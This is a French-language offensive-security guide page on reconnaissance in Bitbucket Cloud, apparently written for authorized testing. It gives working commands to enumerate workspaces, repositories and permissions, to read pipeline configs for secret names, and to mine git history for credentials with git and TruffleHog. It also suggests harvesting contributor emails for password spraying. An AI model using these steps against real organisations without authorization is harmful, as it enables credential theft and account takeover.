---
title: "Reconnaissance"
order: 1
description: "Énumérer les espaces de travail, projets, dépôts et membres Bitbucket Cloud via l'API 2.0, lire le code source et bitbucket-pipelines.yml, et extraire des secrets de tout l'historique de clonage avec des commandes git manuelles et des scanners d'historique."
keywords:
  - reconnaissance Bitbucket
  - énumération d'espace de travail
  - collecte de secrets
  - historique git
  - bitbucket-pipelines.yml
---

# Reconnaissance

La reconnaissance sur Bitbucket Cloud répond à deux questions : **qu'atteint mon identifiant à travers la hiérarchie espace de travail -> projet -> dépôt**, et **quels secrets se trouvent déjà dans le code et son historique**. Tout s'exécute contre `https://api.bitbucket.org/2.0` avec une authentification Basic (`username:app_password`) ou Bearer (un jeton d'accès), plus `git` sur HTTPS pour le travail approfondi sur l'historique.

## Empreinte et prérequis

Avant d'énumérer, confirmez ce qu'est l'identifiant et ce qu'il voit. Un simple appel `/2.0/user` qui renvoie du JSON signifie que l'identifiant est un mot de passe d'application lié à un utilisateur ou un jeton API Atlassian ; un jeton d'accès se résout vers une ressource à la place.

```bash
# Basic auth with an app password (username is the Atlassian account username, not the email)
curl -s -u "$BB_USER:$BB_APP_PASSWORD" https://api.bitbucket.org/2.0/user | jq '{username,account_id}'

# Bearer auth with a repository/project/workspace access token
curl -s -H "Authorization: Bearer $BB_TOKEN" https://api.bitbucket.org/2.0/user
```

Un `401` sur `/2.0/user` avec un jeton Bearer est attendu pour un jeton d'accès de dépôt (il n'a pas d'identité d'utilisateur) ; repliez-vous sur les endpoints de ressources ci-dessous. Les requêtes non authentifiées renvoient toujours des métadonnées pour tout dépôt et espace de travail **public**, exécutez donc la liste des dépôts avec et sans identifiants pour séparer l'exposition publique de la portée privée.

## Énumérer la hiérarchie

Parcourez de haut en bas. Les espaces de travail d'abord, puis les dépôts, puis les personnes et permissions attachées à chacun.

```bash
AUTH=(-u "$BB_USER:$BB_APP_PASSWORD")

# Workspaces the credential belongs to
curl -s "${AUTH[@]}" https://api.bitbucket.org/2.0/workspaces | jq -r '.values[] | "\(.slug)\t\(.name)"'

# All repositories in a workspace, following pagination
next="https://api.bitbucket.org/2.0/repositories/ACME?pagelen=100"
while [ "$next" != "null" ] && [ -n "$next" ]; do
  page=$(curl -s "${AUTH[@]}" "$next")
  echo "$page" | jq -r '.values[] | "\(.full_name)\t\(.is_private)\t\(.mainbranch.name)"'
  next=$(echo "$page" | jq -r '.next // "null"')
done

# Members and their permission level (admin/write/read)
curl -s "${AUTH[@]}" https://api.bitbucket.org/2.0/workspaces/ACME/permissions | \
  jq -r '.values[] | "\(.user.nickname // .user.display_name)\t\(.permission)"'

# Projects (the optional grouping layer); a project key scopes repositories and project access tokens
curl -s "${AUTH[@]}" https://api.bitbucket.org/2.0/workspaces/ACME/projects | jq -r '.values[].key'
```

Interprétez la sortie : les dépôts `is_private=false` sont lisibles par n'importe qui et sont le premier endroit où chercher des secrets divulgués ; une `permission` de type `admin` sur votre propre principal signifie que vous pourrez plus tard ajouter des jetons d'accès, des clés SSH et des webhooks. Le `mainbranch.name` vous indique sur quelle branche s'exécute un pipeline par défaut.

## Lire le code source et la configuration du pipeline sans cloner

L'endpoint `src` sert n'importe quel fichier à n'importe quelle référence, ce qui est rapide pour récupérer le fichier le plus utile de chaque dépôt, `bitbucket-pipelines.yml` :

```bash
# List the repo root at the main branch
curl -s "${AUTH[@]}" https://api.bitbucket.org/2.0/repositories/ACME/payments-api/src/HEAD/ | \
  jq -r '.values[].path'

# Pull the pipeline config directly
curl -s "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/src/HEAD/bitbucket-pipelines.yml
```

La configuration du pipeline nomme les variables qu'un build consomme (`$AWS_SECRET_ACCESS_KEY`, `$NPM_TOKEN`, noms d'environnements de déploiement). Cela vous indique exactement ce qu'une exécution de Pipelines vous remettrait avant même de la déclencher, et quels dépôts valent le chemin [Abus des pipelines](pipelines-abuse.md).

Lorsque le plan de l'espace de travail inclut la recherche de code, faites un grep sur tous les dépôts à la fois :

```bash
curl -s "${AUTH[@]}" \
  "https://api.bitbucket.org/2.0/workspaces/ACME/search/code?search_query=aws_secret_access_key"
```

## Extraire des secrets de tout l'historique

Le `HEAD` actuel est l'endroit le moins intéressant à examiner. Les secrets sont généralement committés puis supprimés dans un commit ultérieur, de sorte qu'ils ne survivent que dans l'historique. Clonez avec l'identifiant intégré et analysez l'ensemble du graphe d'objets.

```bash
# App password in the clone URL (URL-encode characters if needed)
git clone https://$BB_USER:$BB_APP_PASSWORD@bitbucket.org/ACME/payments-api.git
cd payments-api

# Every value ever assigned to a secret-looking key, across all history
git log -p --all -G'(secret|token|password|api[_-]?key|BEGIN [A-Z ]*PRIVATE KEY)' \
  | grep -iE '(secret|token|password|api[_-]?key|PRIVATE KEY)'

# Dangling and unreferenced blobs (content from deleted branches and amended commits)
git fsck --unreachable --no-reflogs 2>/dev/null | awk '/blob/ {print $3}' | \
  while read -r b; do git cat-file -p "$b"; done | grep -iE 'secret|token|password|AKIA[0-9A-Z]{16}'
```

Interprétez une correspondance : un résultat à l'intérieur d'un `.env` supprimé, d'un `settings.py` ou d'une configuration CI est un identifiant actif jusqu'à preuve du contraire. Un `AKIA...` plus un secret de 40 caractères est une clé AWS à long terme ; transmettez-la au chemin [AWS](../../cloud/aws/index.md). Une chaîne `ATBB...` ou `ATCTT...` est un mot de passe d'application ou un jeton d'accès Bitbucket, qui renvoie directement à [Abus des jetons et mots de passe d'application](token-and-app-password-abuse.md).

Automatisez le même balayage sur tous les dépôts que vous avez énumérés :

```bash
for repo in $(curl -s "${AUTH[@]}" \
  "https://api.bitbucket.org/2.0/repositories/ACME?pagelen=100" | jq -r '.values[].full_name'); do
  git clone --quiet "https://$BB_USER:$BB_APP_PASSWORD@bitbucket.org/$repo.git" "/tmp/$repo" 2>/dev/null
  trufflehog git "file:///tmp/$repo" --only-verified
done
```

`--only-verified` limite la sortie aux identifiants avec lesquels TruffleHog a pu réellement s'authentifier, ce qui supprime le bruit des valeurs d'exemple et des clés ayant été renouvelées.

## Variantes et suite

- **Téléchargements et artefacts** : `/2.0/repositories/ACME/{repo}/downloads/` contient souvent des archives construites et des sauvegardes téléversées manuellement ; elles ne sont pas dans `git` et sont donc manquées par les scanners d'historique.
- **Texte des tickets et des PR** : les corps et commentaires de `/2.0/repositories/ACME/{repo}/issues` et `/pullrequests` collent fréquemment des jetons, des noms d'hôte internes et des chaînes de connexion.
- **Collecte des auteurs de commits** : `git log --all --format='%ae'` donne les e-mails Atlassian de chaque contributeur, ce qui amorce le password spraying contre le SSO Atlassian et le chemin des jetons API Atlassian.
- **Suite** : un `bitbucket-pipelines.yml` que vous pouvez lire plus un accès en écriture sur n'importe quelle branche constituent le relais vers [Abus des pipelines](pipelines-abuse.md) ; un identifiant Bitbucket récolté constitue le relais vers [Abus des jetons et mots de passe d'application](token-and-app-password-abuse.md).

## Notes

- La pagination Bitbucket utilise une URL `next`, pas un compteur de page ; une boucle qui s'arrête à la première page manque silencieusement la plupart des dépôts dans les grands espaces de travail.
- Les valeurs des variables de pipeline sécurisées ne sont **pas** renvoyées par l'API (elles sont en écriture seule), donc la reconnaissance vous montre les noms des variables mais pas leurs valeurs ; lire les valeurs nécessite le chemin d'exécution de Pipelines.
- Sur Bitbucket Data Center/Server, les équivalents sont `/rest/api/1.0/projects`, `/rest/api/1.0/projects/{key}/repos` et les jetons d'accès HTTP Bearer ; il n'y a pas de `bitbucket-pipelines.yml` car Server n'a pas de Pipelines.

## Outils

- **git** (`log -p -G`, `fsck --unreachable`, `cat-file`) : extraction manuelle de l'historique et des objets non référencés.
- **TruffleHog** : détection vérifiée de secrets sur tout l'historique `git`.
- **Gitleaks** : analyse de secrets par regex et entropie d'un clone ou d'une arborescence de répertoires.
- **jq** : analyser et paginer les réponses JSON de l'API 2.0.

## Références

- [Bitbucket Cloud REST API : repositories](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-repositories/)
- [Bitbucket Cloud REST API : workspaces](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-workspaces/)
- [TruffleHog](https://github.com/trufflesecurity/trufflehog)
- [Gitleaks](https://github.com/gitleaks/gitleaks)
- [Atlassian : use the src endpoint to read files](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-source/)
